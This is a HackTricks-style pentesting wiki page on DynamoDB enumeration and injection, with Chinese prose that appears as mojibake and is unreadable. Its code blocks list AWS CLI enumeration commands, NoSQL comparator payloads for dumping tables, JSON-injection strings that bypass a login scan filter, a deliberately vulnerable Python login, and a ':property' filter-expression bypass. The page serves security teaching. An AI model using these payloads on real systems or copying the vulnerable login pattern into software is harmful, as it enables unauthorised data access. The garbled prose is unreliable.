# AWS - DynamoDB Enum

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## DynamoDB

### åŸºæœ¬ä¿¡æ¯

Amazon DynamoDB è¢« AWS æä¾›ä¸ºä¸€ä¸ª **å®Œå…¨æ‰˜ç®¡çš„æ— æœåŠ¡å™¨é”®å€¼ NoSQL æ•°æ®åº“**ï¼Œæ—¨åœ¨ä¸ºå„ç§è§„æ¨¡çš„é«˜æ€§èƒ½åº”ç”¨æä¾›æ”¯æŒã€‚è¯¥æœåŠ¡ç¡®ä¿äº†å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬å†…ç½®çš„å®‰å…¨æªæ–½ã€ä¸é—´æ–­çš„å¤‡ä»½ã€è·¨å¤šä¸ªåŒºåŸŸçš„è‡ªåŠ¨å¤åˆ¶ã€é›†æˆçš„å†…å­˜ç¼“å­˜å’Œä¾¿æ·çš„æ•°æ®å¯¼å‡ºå·¥å…·ã€‚

åœ¨ DynamoDB çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè€Œä¸æ˜¯å»ºç«‹ä¼ ç»Ÿæ•°æ®åº“ï¼Œ**åˆ›å»ºè¡¨**ã€‚æ¯ä¸ªè¡¨éƒ½è¦æ±‚æŒ‡å®šä¸€ä¸ª **åˆ†åŒºé”®**ï¼Œä½œä¸º **è¡¨ä¸»é”®** çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚è¿™ä¸ªåˆ†åŒºé”®ï¼Œå®è´¨ä¸Šæ˜¯ä¸€ä¸ª **å“ˆå¸Œå€¼**ï¼Œåœ¨é¡¹ç›®çš„æ£€ç´¢å’Œæ•°æ®åœ¨ä¸åŒä¸»æœºä¹‹é—´çš„åˆ†é…ä¸­èµ·ç€å…³é”®ä½œç”¨ã€‚è¿™ç§åˆ†é…å¯¹äºç»´æŠ¤æ•°æ®åº“çš„å¯æ‰©å±•æ€§å’Œå¯ç”¨æ€§è‡³å…³é‡è¦ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé€‰é¡¹å¯ä»¥åŠ å…¥ **æ’åºé”®** ä»¥è¿›ä¸€æ­¥ç»†åŒ–æ•°æ®ç»„ç»‡ã€‚

### åŠ å¯†

é»˜è®¤æƒ…å†µä¸‹ï¼ŒDynamoDB ä½¿ç”¨ä¸€ä¸ª **å±äº Amazon DynamoDB çš„ KMS å¯†é’¥ï¼Œ**ç”šè‡³ä¸æ˜¯è‡³å°‘å±äºæ‚¨è´¦æˆ·çš„ AWS ç®¡ç†å¯†é’¥ã€‚

<figure><img src="https://lh4.googleusercontent.com/JjtNS7aA-_GRMgZb4v93jWEQJi6DQdUPq0FEpzZPdeyCeNoG05p0NJiV9Zs-ULs_-Tfjmx0W1ZgsE2Ui2ljo7D-1a87Xny-gpLVQO0XmXdFoph9ci1RepbVNwaCe9oPruEZSEDxGTxF5dIv6pW1WpT6kWA=s2048" alt=""><figcaption></figcaption></figure>

### å¤‡ä»½ä¸å¯¼å‡ºåˆ° S3

å¯ä»¥ **å®‰æ’** ç”Ÿæˆ **è¡¨å¤‡ä»½** æˆ–æŒ‰ **éœ€** åˆ›å»ºå®ƒä»¬ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä¸ºè¡¨å¯ç”¨ **æ—¶é—´ç‚¹æ¢å¤ (PITR)**ã€‚æ—¶é—´ç‚¹æ¢å¤ä¸ºæ‚¨çš„ DynamoDB æ•°æ®æä¾›è¿ç»­çš„ **å¤‡ä»½**ï¼ŒæŒç»­ **35 å¤©**ï¼Œä»¥å¸®åŠ©æ‚¨é˜²æ­¢æ„å¤–çš„å†™å…¥æˆ–åˆ é™¤æ“ä½œã€‚

è¿˜å¯ä»¥å°† **è¡¨çš„æ•°æ®å¯¼å‡ºåˆ° S3**ï¼Œä½†è¯¥è¡¨éœ€è¦å¯ç”¨ **PITR**ã€‚

### GUI

æœ‰ä¸€ä¸ªç”¨äºæœ¬åœ° Dynamo æœåŠ¡çš„ GUIï¼Œå¦‚ [DynamoDB Local](https://aws.amazon.com/blogs/aws/dynamodb-local-for-desktop-development/)ã€[dynalite](https://github.com/mhart/dynalite)ã€[localstack](https://github.com/localstack/localstack) ç­‰ï¼Œè¿™äº›å¯èƒ½ä¼šå¾ˆæœ‰ç”¨ï¼š[https://github.com/aaronshaf/dynamodb-admin](https://github.com/aaronshaf/dynamodb-admin)

### æšä¸¾
```bash
# Tables
aws dynamodb list-tables
aws dynamodb describe-table --table-name <t_name> #Get metadata info
## The primary key and sort key will appear inside the KeySchema field

#Check if point in time recovery is enabled
aws dynamodb describe-continuous-backups \
--table-name tablename

# Backups
aws dynamodb list-backups
aws dynamodb describe-backup --backup-arn <arn>
aws dynamodb describe-continuous-backups --table-name <t_name>

# Global tables
aws dynamodb list-global-tables
aws dynamodb describe-global-table --global-table-name <name>

# Exports
aws dynamodb list-exports
aws dynamodb describe-export --export-arn <arn>

# Misc
aws dynamodb describe-endpoints #Dynamodb endpoints
```
### æœªç»èº«ä»½éªŒè¯çš„è®¿é—®

{% content-ref url="../aws-unauthenticated-enum-access/aws-dynamodb-unauthenticated-access.md" %}
[aws-dynamodb-unauthenticated-access.md](../aws-unauthenticated-enum-access/aws-dynamodb-unauthenticated-access.md)
{% endcontent-ref %}

### æƒé™æå‡

{% content-ref url="../aws-privilege-escalation/aws-dynamodb-privesc.md" %}
[aws-dynamodb-privesc.md](../aws-privilege-escalation/aws-dynamodb-privesc.md)
{% endcontent-ref %}

### åˆ©ç”¨å

{% content-ref url="../aws-post-exploitation/aws-dynamodb-post-exploitation.md" %}
[aws-dynamodb-post-exploitation.md](../aws-post-exploitation/aws-dynamodb-post-exploitation.md)
{% endcontent-ref %}

### æŒä¹…æ€§

{% content-ref url="../aws-persistence/aws-dynamodb-persistence.md" %}
[aws-dynamodb-persistence.md](../aws-persistence/aws-dynamodb-persistence.md)
{% endcontent-ref %}

## DynamoDB æ³¨å…¥

### SQL æ³¨å…¥

æœ‰æ–¹æ³•å¯ä»¥ä½¿ç”¨ **SQL è¯­æ³•** è®¿é—® DynamoDB æ•°æ®ï¼Œå› æ­¤ï¼Œå…¸å‹çš„ **SQL æ³¨å…¥ä¹Ÿæ˜¯å¯èƒ½çš„**ã€‚

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection" %}

### NoSQL æ³¨å…¥

åœ¨ DynamoDB ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„ **æ¡ä»¶** æ¥æ£€ç´¢æ•°æ®ï¼Œå°±åƒåœ¨å¸¸è§çš„ NoSQL æ³¨å…¥ä¸­ï¼Œå¦‚æœå¯ä»¥ **é“¾æ¥æ›´å¤šæ¡ä»¶ä»¥æ£€ç´¢** æ•°æ®ï¼Œæ‚¨å¯èƒ½ä¼šè·å¾—éšè—çš„æ•°æ®ï¼ˆæˆ–è½¬å‚¨æ•´ä¸ªè¡¨ï¼‰ã€‚\
æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ° DynamoDB æ”¯æŒçš„æ¡ä»¶ï¼š[https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html)

è¯·æ³¨æ„ï¼Œå¦‚æœé€šè¿‡ **`query`** æˆ– **`scan`** è®¿é—®æ•°æ®ï¼Œåˆ™æ”¯æŒ **ä¸åŒçš„æ¡ä»¶**ã€‚

{% hint style="info" %}
å®é™…ä¸Šï¼Œ**Query** æ“ä½œéœ€è¦åœ¨ **ä¸»** é”®ä¸­æŒ‡å®š **æ¡ä»¶ "EQ"ï¼ˆç­‰äºï¼‰** æ‰èƒ½å·¥ä½œï¼Œè¿™ä½¿å…¶ **æ›´ä¸å®¹æ˜“å—åˆ° NoSQL æ³¨å…¥**ï¼ˆå¹¶ä¸”è¿˜ä½¿æ“ä½œéå¸¸æœ‰é™ï¼‰ã€‚
{% endhint %}

å¦‚æœæ‚¨å¯ä»¥ **æ›´æ”¹æ‰§è¡Œçš„æ¯”è¾ƒ** æˆ–æ·»åŠ æ–°çš„æ¯”è¾ƒï¼Œæ‚¨å¯èƒ½ä¼šæ£€ç´¢åˆ°æ›´å¤šæ•°æ®ã€‚
```bash
# Comparators to dump the database
"NE": "a123" #Get everything that doesn't equal "a123"
"NOT_CONTAINS": "a123" #What you think
"GT": " " #All strings are greater than a space
```
{% embed url="https://book.hacktricks.xyz/pentesting-web/nosql-injection" %}

### åŸå§‹ Json æ³¨å…¥

{% hint style="danger" %}
**æ­¤æ¼æ´åŸºäºç°å·²å¼ƒç”¨çš„ dynamodb æ‰«æè¿‡æ»¤å™¨ï¼**
{% endhint %}

**DynamoDB** æ¥å— **Json** å¯¹è±¡ä»¥ **æœç´¢** æ•°æ®ã€‚å¦‚æœä½ å‘ç°å¯ä»¥åœ¨å‘é€çš„ json å¯¹è±¡ä¸­è¿›è¡Œå†™å…¥ï¼Œä½ å¯ä»¥ä½¿æ•°æ®åº“è½¬å‚¨æ‰€æœ‰å†…å®¹ã€‚

ä¾‹å¦‚ï¼Œåœ¨è¯·æ±‚ä¸­æ³¨å…¥å¦‚ä¸‹å†…å®¹ï¼š

{% code overflow="wrap" %}
```bash
'{"Id": {"ComparisonOperator": "EQ","AttributeValueList": [{"N": "' + user_input + '"}]}}'
```
{% endcode %}

æ”»å‡»è€…å¯ä»¥æ³¨å…¥ç±»ä¼¼äºï¼š

`1000"}],"ComparisonOperator": "GT","AttributeValueList": [{"N": "0`

ä¿®å¤â€œEQâ€æ¡ä»¶ï¼Œæœç´¢ ID 1000ï¼Œç„¶åæŸ¥æ‰¾æ‰€æœ‰ Id å­—ç¬¦ä¸²å¤§äº 0 çš„æ•°æ®ï¼Œå³æ‰€æœ‰æ•°æ®ã€‚

å¦ä¸€ä¸ª **ä½¿ç”¨ç™»å½•çš„è„†å¼±ç¤ºä¾‹** å¯ä»¥æ˜¯ï¼š
```python
scan_filter = """{
"username": {
"ComparisonOperator": "EQ",
"AttributeValueList": [{"S": "%s"}]
},
"password": {
"ComparisonOperator": "EQ",
"AttributeValueList": [{"S": "%s"}]
}
}
""" % (user_data['username'], user_data['password'])

dynamodb.scan(TableName="table-name", ScanFilter=json.loads(scan_filter))
```
è¿™å°†å®¹æ˜“å—åˆ°ä»¥ä¸‹æ”»å‡»ï¼š
```
username: none"}],"ComparisonOperator": "NE","AttributeValueList": [{"S": "none
password: none"}],"ComparisonOperator": "NE","AttributeValueList": [{"S": "none
```
### :property Injection

æŸäº› SDK å…è®¸ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ¥æŒ‡ç¤ºè¦æ‰§è¡Œçš„è¿‡æ»¤ï¼Œå¦‚ï¼š 

{% code overflow="wrap" %}
```java
new ScanSpec().withProjectionExpression("UserName").withFilterExpression(user_input+" = :username and Password = :password").withValueMap(valueMap)
```
{% endcode %}

æ‚¨éœ€è¦çŸ¥é“ï¼Œåœ¨DynamoDBä¸­æœç´¢ä»¥**æ›¿æ¢**å±æ€§**å€¼**çš„**è¿‡æ»¤è¡¨è¾¾å¼**æ—¶ï¼Œä»¤ç‰Œåº”ä»¥**`:`**å­—ç¬¦**å¼€å¤´**ã€‚è¿™æ ·çš„ä»¤ç‰Œå°†åœ¨è¿è¡Œæ—¶**æ›¿æ¢**ä¸ºå®é™…çš„**å±æ€§å€¼**ã€‚

å› æ­¤ï¼Œåƒä¹‹å‰çš„ç™»å½•å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š
```bash
:username = :username or :username
# This will generate the query:
# :username = :username or :username = :username and Password = :password
# which is always true
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
